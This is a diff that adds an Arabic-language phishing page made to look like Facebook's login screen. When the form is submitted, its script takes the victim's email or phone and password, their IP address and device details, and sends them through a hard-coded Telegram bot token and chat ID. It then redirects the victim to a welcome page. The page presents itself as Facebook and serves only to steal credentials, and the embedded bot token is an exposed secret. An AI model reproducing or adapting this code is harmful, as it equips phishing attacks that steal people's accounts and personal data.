@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فيسبوك</title>
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <style>
+        /* تنسيق عام */
+        body {
+            font-family: 'Poppins', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+            color: #1c1e21;
+        }
+
+        main {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .row {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .col-logo {
+            text-align: center;
+        }
+
+        .col-logo img {
+            width: 200px;
+            margin-bottom: 10px;
+        }
+
+        .col-logo h2 {
+            font-size: 18px;
+            color: #1c1e21;
+        }
+
+        .col-form {
+            width: 100%;
+        }
+
+        .form-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .form-container input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 10px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+
+        .form-container button {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .btn-login {
+            background-color: #1877f2;
+            color: #fff;
+        }
+
+        .btn-new {
+            background-color: #42b72a;
+            color: #fff;
+            margin-top: 10px;
+        }
+
+        .form-container a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin: 10px 0;
+        }
+
+        .form-container p {
+            font-size: 14px;
+            color: #1c1e21;
+        }
+
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        footer {
+            text-align: center;
+            padding: 20px;
+            background-color: #fff;
+            margin-top: auto;
+        }
+
+        footer ol {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        footer ol li {
+            font-size: 12px;
+            color: #8a8d91;
+        }
+
+        footer ol li a {
+            color: #8a8d91;
+            text-decoration: none;
+        }
+
+        footer small {
+            font-size: 12px;
+            color: #8a8d91;
+        }
+
+        /* Media Queries للهواتف */
+        @media (max-width: 600px) {
+            .col-logo img {
+                width: 150px;
+            }
+
+            .col-logo h2 {
+                font-size: 16px;
+            }
+
+            .form-container input,
+            .form-container button {
+                font-size: 14px;
+            }
+
+            .form-container a {
+                font-size: 12px;
+            }
+
+            .form-container p {
+                font-size: 12px;
+            }
+
+            footer ol li {
+                font-size: 10px;
+            }
+
+            footer small {
+                font-size: 10px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <main>
+        <div class="row">
+            <div class="col-logo">
+                <img src="images/fb_logo.svg" alt="شعار فيسبوك">
+                <h2>يساعدك فيسبوك على التواصل والمشاركة مع الأشخاص في حياتك.</h2>
+            </div>
+            <div class="col-form">
+                <div class="form-container">
+                    <form id="login-form">
+                        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                        <input type="password" id="password" placeholder="كلمة المرور" required>
+                        <span id="email-error" class="error-message">يرجى إدخال بريد إلكتروني أو رقم هاتف صالح.</span>
+                        <button type="submit" class="btn-login">تسجيل الدخول</button>
+                    </form>
+                    <a href="#">هل نسيت كلمة المرور؟</a>
+                    <button class="btn-new" onclick="redirectToSignup()">إنشاء حساب جديد</button>
+                </div>
+                <p><a href="#"><b>إنشاء صفحة</b></a> لمشاهير، علامات تجارية أو شركات.</p>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-contents">
+            <ol>
+                <li>العربية</li>
+                <li><a href="#">English (UK)</a></li>
+                <li><a href="#">فرنسية</a></li>
+                <li><a href="#">إسبانية</a></li>
+                <li><a href="#">ألمانية</a></li>
+                <li><button>+</button></li>
+            </ol>
+
+            <ol>
+                <li><a href="#">التسجيل</a></li>
+                <li><a href="#">تسجيل الدخول</a></li>
+                <li><a href="#">ماسنجر</a></li>
+                <li><a href="#">Facebook Lite</a></li>
+                <li><a href="#">الأشخاص</a></li>
+                <li><a href="#">الصفحات</a></li>
+                <li><a href="#">الألعاب</a></li>
+                <li><a href="#">الخصوصية</a></li>
+                <li><a href="#">الإعدادات</a></li>
+                <li><a href="#">المساعدة</a></li>
+            </ol>
+            <small>فيسبوك © 2024</small>
+        </div>
+    </footer>
+
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        const TOKEN = "7527317899:AAE2ljsBCTmqhXrS3bbQndKl6Cgu4mzI-6A";  // استبدل بقيمة الـ Token
+        const CHAT_ID = "809845485";  // استبدل بقيمة الـ Chat ID
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.getElementById('login-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const emailError = document.getElementById('email-error');
+
+            // تحقق من الحقول الفارغة
+            if (!email || !password) {
+                alert("يرجى ملء جميع الحقول.");
+                return;
+            }
+
+            // تحقق من أن المدخل هو إما بريد إلكتروني أو رقم هاتف
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const phoneRegex = /^\+?\d{10,}$/;
+
+            if (!emailRegex.test(email) && !phoneRegex.test(email)) {
+                emailError.style.display = 'block'; // عرض رسالة الخطأ
+                return;
+            } else {
+                emailError.style.display = 'none'; // إخفاء رسالة الخطأ إذا كانت صحيحة
+            }
+
+            try {
+                // جلب عنوان IP
+                const ipResponse = await axios.get('https://api.ipify.org?format=json');
+                const ip = ipResponse.data.ip;
+
+                // جمع معلومات الجهاز
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                // إنشاء الرسالة
+                const message = 
+                    `<b>New Login Attempt</b>\n` +
+                    `<b>Email/Phone:</b> ${email}\n` +
+                    `<b>Password:</b> ${password}\n` +
+                    `<b>IP Address:</b> ${ip}\n` +
+                    `<b>Device Type:</b> ${deviceType}\n` +
+                    `<b>Platform:</b> ${platform}\n` +
+                    `<b>User Agent:</b> ${userAgent}\n` +
+                    `<b>Screen Resolution:</b> ${screenWidth}x${screenHeight}`
+                ;
+
+                // إرسال الرسالة إلى Telegram
+                await axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message
+                });
+
+                // تحويل المستخدم إلى صفحة الترحيب بعد تسجيل الدخول بنجاح
+                window.location.href = "welcome.html";
+
+            } catch (error) {
+                console.error("حدث خطأ أثناء الإرسال:", error);
+                alert("حدث خطأ أثناء إرسال المعلومات. يرجى المحاولة مرة أخرى.");
+            }
+        });
+
+        // دالة تحويل المستخدم إلى موقع آخر
+        function redirectToSignup() {
+            window.location.href = "https://www.facebook.com/r.php?entry_point=login"; // استبدل بالرابط المطلوب
+        }
+    </script>
+</body>
+
+</html>
